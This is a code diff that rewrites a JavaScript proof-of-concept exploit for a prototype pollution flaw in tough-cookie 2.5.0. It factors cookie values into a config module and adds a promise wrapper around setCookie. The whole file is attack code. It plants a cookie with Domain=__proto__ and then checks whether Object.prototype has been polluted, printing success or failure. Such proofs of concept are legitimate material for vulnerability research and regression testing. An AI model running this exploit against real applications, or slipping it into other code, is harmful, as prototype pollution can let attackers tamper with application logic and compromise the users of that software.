@@ -1,6 +1,6 @@
-// This file demonstrates an exploit for the Prototype Pollution vulnerability in tough-cookie 2.5.0.
-
 /*
+  This file demonstrates an exploit for the Prototype Pollution vulnerability in tough-cookie 2.5.0.
+
   Vulnerability Details:
    In tough-cookie 2.5.0, when creating a CookieJar with rejectPublicSuffixes=false,
    the internal store is built using objects that inherit from Object.prototype. This means
@@ -18,28 +18,47 @@
         Expected Output: "EXPLOIT FAILED"
 */
 
-let tough = require('tough-cookie');
+var assert = require('assert');
+var tough = require("tough-cookie");
+var config = require("./lib/config.js");
 
-async function runExploit() {
-  // Create a CookieJar with rejectPublicSuffixes set to false
-  const jar = new tough.CookieJar(undefined, {rejectPublicSuffixes: false});
+async function setCookie(jar, cookieString, url) {
+  return new Promise((resolve, reject) => {
+    jar.setCookie(cookieString, url, {}, (err, cookie) => {
+      if (err) return reject(err);
+      resolve(cookie);
+    });
+  });
+}
 
-  // Exploit cookie: attempt to set a cookie whose domain is "__proto__"
+function log(message) {
+  const timestamp = new Date().toISOString();
+  console.log(message);
+};
+
+async function exploitPollution() {
+  const jar = new tough.CookieJar(undefined, { rejectPublicSuffixes: config.rejectPublicSuffixes });
+
   try {
-    await jar.setCookie("malicious=exploit; Domain=__proto__; Path=/", "https://__proto__/dummy");
-    // Now, in a vulnerable version, the Object.prototype would have been polluted.
-    // For example, if we try to access any object property, it might be overridden.
+    // Exploit cookie
+    await setCookie(jar, `${config.exploitCookieName}=${config.exploitCookieValue}; Domain=${config.cookieDomain}; Path=${config.cookiePath}`, config.testUrl);
+
+    // Normal cookie
+    await setCookie(jar, `${config.normalCookieName}=${config.normalCookieValue}; Domain=${config.googleCookieDomain}; Path=${config.cookiePath}`, config.normalUrl);
+
+    // Check for pollution
     const obj = {};
-    // If the exploit worked, obj.malicious would exist.
-    if (obj.malicious === "exploit") {
-      console.log("EXPLOITED SUCCESSFULLY");
+    const pollutedObject = obj[config.cookiePath] && obj[config.cookiePath][config.exploitCookieName];
+
+    if (pollutedObject?.value === config.exploitCookieValue) {
+      log(config.exploitedSuccessfully);
     } else {
-      console.log("EXPLOIT FAILED");
+      log(config.exploitFailed);
     }
   } catch (e) {
-    console.error("Error during exploit attempt:", e);
-    console.log("EXPLOIT FAILED");
+    log(`${config.exploitError}: ${e.message}`);
+    log(config.exploitFailed);
   }
 }
 
-runExploit();
+exploitPollution();
